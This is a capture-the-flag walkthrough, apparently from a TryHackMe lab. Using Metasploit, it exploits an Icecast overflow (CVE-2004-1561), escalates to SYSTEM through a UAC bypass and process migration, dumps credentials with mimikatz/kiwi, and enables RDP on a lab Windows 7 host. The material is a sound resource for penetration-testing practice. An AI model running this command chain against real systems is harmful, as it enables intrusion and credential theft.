To answer task number 3, we'll have to use https://www.cvedetails.com

The Icecast vuln is CVE-2004-1561
Which came out in 2004
It's rated at a 7.5
And it affects Icecast version 2.0, and 2.0.1

This is a Execute Code Overflow

"""

"""
We'll have to use metasploit now that we've found our CVE

msfconsole

search 2004-1561

use 0

The only options we need to change is RHOSTS
And we have to set it to our attacker machine

set RHOSTS 10.10.27.176

Also we have to change our LHOST option to our Tun0 IP

Now we can enter run

It worked!

Now we have a meterpreter shell

Now we'll enter getuid

Our Server username is: Dark-PC\Dark

We'll enter sysinfo next

Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows

We're running x64 Windows Architecture

We'll now start to privec process

We'll run this script: run post/multi/recon/local_exploit_suggester

Results:

Our first result is exploit/windows/local/bypassuac_eventvwr
We'll be using this one

Lets backgroung this session real quick
After enter sessions to check 

We'll next enter: use FULL_PATH_FOR_EXPLOIT
That didn't work

Lets try using our last exploit
use windows/local/bypassuac_eventvwr

Show options

Lets enter: set session 1

We'll have to change our LHOST listner IP

So lets check our IP on the THM network by using: ip addr

Now set your LHOST to your IP on the THM network

Enter run
//This might take a couple of tries\\

Now lets enter sessions 2

We'll have to verify our permissons 
Lets use the command: getprivs

Lets enter: ps

We're looking for spoolsv.exe
Now lets enter: migrate -N spoolsv.exe

Now lets enter the command: getuid

Results:
NT AUTHORITY\SYSTEM

We'll use mimikatz now
Enter: load kiwi

Now lets run creds_all

Results:

"""
We're going to now go back to metasploit and execute the following command:  run /post/windows/manage/enable_rdp

search for: post/windows/manage/enable_rdp

In my case it's number 33

Lets use that

Show options

Lets now set session to 1

And lets run that

And just like that we're done
